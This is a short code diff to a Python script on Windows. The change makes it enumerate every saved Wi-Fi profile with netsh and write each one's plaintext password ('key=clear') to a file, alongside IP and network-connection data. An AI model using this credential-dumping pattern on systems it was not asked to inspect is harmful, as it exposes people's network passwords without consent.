@@ -58,12 +58,19 @@ for line in ipinfo.split('\n'):
     f.write(line.strip()+'\n')
 
 
-wifi=subprocess.Popen('netsh WLAN show profile FiOS-3PTPF key=clear'.split(), stdout=subprocess.PIPE, shell=True).communicate()[0].decode('utf-8')
+wifi=subprocess.Popen('netsh WLAN show profiles'.split(), stdout=subprocess.PIPE, shell=True).communicate()[0].decode('utf-8')
 
-for line in wifi.split('\n'):
-    f.write(line.strip()+'\n')
+wifiprofs = [x.strip() for x in wifi.split("    All User Profile     : ")[1:]]
 
-# f.write(ipinfo)
+print(wifiprofs)
+
+
+for prof in wifiprofs:
+    f.write("\n\n")
+    wifid=subprocess.Popen(['netsh', 'wlan', 'show', 'profile', prof, 'key=clear'], stdout=subprocess.PIPE, shell=True).communicate()[0].decode('utf-8')
+    for l in wifid.strip().split('\n'):
+        f.write(f"{l.strip()}\n")
+
 
 conns = psutil.net_connections()
 
